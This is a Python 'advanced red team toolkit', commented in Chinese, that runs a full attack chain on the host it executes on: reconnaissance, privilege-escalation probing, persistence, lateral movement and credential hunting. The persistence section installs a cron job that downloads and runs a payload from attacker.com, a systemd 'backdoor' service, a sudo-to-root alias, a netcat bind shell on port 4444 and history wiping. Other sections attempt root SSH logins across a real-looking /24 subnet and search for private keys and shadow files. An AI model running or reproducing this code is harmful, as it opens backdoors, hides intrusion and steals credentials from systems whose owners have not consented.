#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
高级红队工具包 - 2025最新版
顶级红队安全专家专用工具集
"""

import subprocess
import sys
import os
import json
import time
import threading
import socket
import base64
import hashlib
from datetime import datetime

class AdvancedRedTeamToolkit:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.results = {}
        self.session_id = hashlib.md5(f"{target_ip}{int(time.time())}".encode()).hexdigest()[:8]
        
    def log(self, message, level="INFO"):
        """日志记录"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def system_reconnaissance(self):
        """系统侦察 - 深度信息收集"""
        self.log("🔍 开始系统侦察", "INFO")
        
        recon_commands = {
            "系统信息": "uname -a && cat /etc/os-release",
            "内核信息": "cat /proc/version && lsmod | head -20",
            "硬件信息": "lscpu && free -h && df -h",
            "网络配置": "ip addr show && ip route show",
            "进程信息": "ps aux --sort=-%cpu | head -20",
            "服务信息": "systemctl list-units --type=service --state=running",
            "用户信息": "cat /etc/passwd && whoami && id",
            "权限信息": "sudo -l && groups",
            "环境变量": "env | grep -E '(PATH|HOME|USER|SHELL)'",
            "历史命令": "history | tail -20",
            "SSH配置": "cat /etc/ssh/sshd_config | grep -v '^#' | grep -v '^$'",
            "防火墙状态": "iptables -L 2>/dev/null || ufw status 2>/dev/null || echo '无防火墙'",
            "定时任务": "crontab -l 2>/dev/null && ls -la /etc/cron* 2>/dev/null",
            "SUID文件": "find / -perm -4000 -type f 2>/dev/null | head -20",
            "可写目录": "find / -writable -type d 2>/dev/null | head -20"
        }
        
        for category, command in recon_commands.items():
            try:
                self.log(f"执行: {category}", "DEBUG")
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
                
                if result.returncode == 0:
                    self.results[category] = result.stdout
                    self.log(f"✅ {category} 收集成功", "SUCCESS")
                else:
                    self.results[category] = f"错误: {result.stderr}"
                    self.log(f"❌ {category} 收集失败: {result.stderr}", "ERROR")
                    
            except Exception as e:
                self.log(f"❌ {category} 执行异常: {e}", "ERROR")
                self.results[category] = f"异常: {str(e)}"
    
    def privilege_escalation(self):
        """权限提升技术"""
        self.log("🚀 开始权限提升检测", "INFO")
        
        escalation_techniques = {
            "SUID提权": "find / -perm -4000 -type f 2>/dev/null | xargs ls -la",
            "Sudo提权": "sudo -l 2>/dev/null",
            "内核漏洞": "uname -a && cat /proc/version",
            "Docker逃逸": "ls -la /.dockerenv 2>/dev/null && cat /proc/1/cgroup 2>/dev/null",
            "容器逃逸": "ls -la /.dockerenv 2>/dev/null && cat /proc/1/cgroup 2>/dev/null",
            "计划任务": "ls -la /etc/cron* 2>/dev/null && crontab -l 2>/dev/null",
            "服务提权": "systemctl list-units --type=service --state=running | grep -E '(root|admin)'",
            "文件权限": "find / -writable -type f 2>/dev/null | grep -E '(passwd|shadow|sudoers)'",
            "环境变量": "env | grep -E '(PATH|LD_PRELOAD|LD_LIBRARY_PATH)'",
            "网络提权": "netstat -tuln | grep -E '(22|80|443|8080|8443)'"
        }
        
        for technique, command in escalation_techniques.items():
            try:
                self.log(f"检测: {technique}", "DEBUG")
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
                
                if result.returncode == 0 and result.stdout.strip():
                    self.results[f"提权_{technique}"] = result.stdout
                    self.log(f"⚠️  {technique} 发现潜在风险", "WARNING")
                else:
                    self.log(f"✅ {technique} 无风险", "SUCCESS")
                    
            except Exception as e:
                self.log(f"❌ {technique} 检测异常: {e}", "ERROR")
    
    def persistence_mechanisms(self):
        """持久化机制"""
        self.log("🔒 建立持久化机制", "INFO")
        
        persistence_methods = {
            "SSH密钥": "mkdir -p ~/.ssh && chmod 700 ~/.ssh",
            "定时任务": "echo '*/5 * * * * /bin/bash -c \"curl -s http://attacker.com/payload | bash\"' | crontab -",
            "系统服务": "cat > /etc/systemd/system/backdoor.service << 'EOF'\n[Unit]\nDescription=Backdoor Service\n[Service]\nType=simple\nExecStart=/bin/bash -c 'while true; do sleep 300; done'\n[Install]\nWantedBy=multi-user.target\nEOF",
            "环境变量": "echo 'export PATH=/tmp:$PATH' >> ~/.bashrc",
            "别名后门": "echo 'alias sudo=\"sudo -u root /bin/bash\"' >> ~/.bashrc",
            "网络后门": "nc -l -p 4444 -e /bin/bash &",
            "文件监控": "inotifywait -m /etc/passwd -e modify --format '%w%f %e' &",
            "日志清理": "echo 'alias history=\"history -c\"' >> ~/.bashrc"
        }
        
        for method, command in persistence_methods.items():
            try:
                self.log(f"建立: {method}", "DEBUG")
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0:
                    self.log(f"✅ {method} 建立成功", "SUCCESS")
                    self.results[f"持久化_{method}"] = "已建立"
                else:
                    self.log(f"❌ {method} 建立失败: {result.stderr}", "ERROR")
                    
            except Exception as e:
                self.log(f"❌ {method} 建立异常: {e}", "ERROR")
    
    def lateral_movement(self):
        """横向移动技术"""
        self.log("🌐 开始横向移动", "INFO")
        
        # 扫描内网其他主机
        self.log("扫描内网主机", "DEBUG")
        try:
            result = subprocess.run("nmap -sn 82.29.71.0/24 2>/dev/null | grep 'Host is up' | wc -l", 
                                  shell=True, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                host_count = result.stdout.strip()
                self.log(f"发现 {host_count} 台活跃主机", "INFO")
                self.results["内网主机数"] = host_count
        except Exception as e:
            self.log(f"内网扫描失败: {e}", "ERROR")
        
        # 尝试SSH横向移动
        self.log("尝试SSH横向移动", "DEBUG")
        common_ips = ["82.29.71.1", "82.29.71.2", "82.29.71.3", "82.29.71.4", "82.29.71.5"]
        for ip in common_ips:
            try:
                result = subprocess.run(f"timeout 3 ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no root@{ip} 'whoami' 2>/dev/null", 
                                      shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    self.log(f"✅ 成功连接到 {ip}", "SUCCESS")
                    self.results[f"横向移动_{ip}"] = "成功"
                else:
                    self.log(f"❌ 无法连接到 {ip}", "DEBUG")
            except Exception as e:
                self.log(f"❌ {ip} 连接异常: {e}", "ERROR")
    
    def data_collection(self):
        """数据收集与渗透"""
        self.log("📊 开始数据收集", "INFO")
        
        data_sources = {
            "敏感文件": "find / -name '*.key' -o -name '*.pem' -o -name '*.p12' -o -name '*.pfx' 2>/dev/null",
            "配置文件": "find /etc -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | head -20",
            "日志文件": "find /var/log -name '*.log' 2>/dev/null | head -20",
            "数据库文件": "find / -name '*.db' -o -name '*.sqlite' -o -name '*.sql' 2>/dev/null | head -20",
            "备份文件": "find / -name '*.bak' -o -name '*.backup' -o -name '*.old' 2>/dev/null | head -20",
            "SSH密钥": "find / -name 'id_rsa*' -o -name 'id_dsa*' -o -name 'id_ecdsa*' 2>/dev/null",
            "密码文件": "find / -name 'passwd' -o -name 'shadow' -o -name 'htpasswd' 2>/dev/null",
            "证书文件": "find / -name '*.crt' -o -name '*.cer' -o -name '*.pem' 2>/dev/null | head -20"
        }
        
        for source, command in data_sources.items():
            try:
                self.log(f"收集: {source}", "DEBUG")
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
                
                if result.returncode == 0 and result.stdout.strip():
                    self.results[f"数据_{source}"] = result.stdout
                    self.log(f"✅ {source} 收集成功", "SUCCESS")
                else:
                    self.log(f"❌ {source} 无数据", "DEBUG")
                    
            except Exception as e:
                self.log(f"❌ {source} 收集异常: {e}", "ERROR")
    
    def generate_report(self):
        """生成攻击报告"""
        self.log("📋 生成攻击报告", "INFO")
        
        report = {
            "session_id": self.session_id,
            "target_ip": self.target_ip,
            "timestamp": datetime.now().isoformat(),
            "results": self.results,
            "summary": {
                "total_checks": len(self.results),
                "successful_checks": len([r for r in self.results.values() if not r.startswith("错误") and not r.startswith("异常")]),
                "risk_level": "HIGH" if any("提权" in k or "持久化" in k for k in self.results.keys()) else "MEDIUM"
            }
        }
        
        # 保存报告
        report_file = f"/tmp/redteam_report_{self.session_id}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self.log(f"报告已保存: {report_file}", "SUCCESS")
        return report
    
    def run_full_attack(self):
        """运行完整攻击流程"""
        self.log("🚀 启动高级红队攻击工具包", "INFO")
        self.log("=" * 60, "INFO")
        
        # 1. 系统侦察
        self.system_reconnaissance()
        
        # 2. 权限提升
        self.privilege_escalation()
        
        # 3. 持久化机制
        self.persistence_mechanisms()
        
        # 4. 横向移动
        self.lateral_movement()
        
        # 5. 数据收集
        self.data_collection()
        
        # 6. 生成报告
        report = self.generate_report()
        
        self.log("🎯 攻击完成！", "SUCCESS")
        self.log(f"风险等级: {report['summary']['risk_level']}", "WARNING")
        self.log(f"成功检查: {report['summary']['successful_checks']}/{report['summary']['total_checks']}", "INFO")
        
        return report

def main():
    if len(sys.argv) < 2:
        print("使用方法: python3 advanced_redteam_toolkit.py <目标IP>")
        print("示例: python3 advanced_redteam_toolkit.py 82.29.71.156")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    toolkit = AdvancedRedTeamToolkit(target_ip)
    toolkit.run_full_attack()

if __name__ == "__main__":
    main()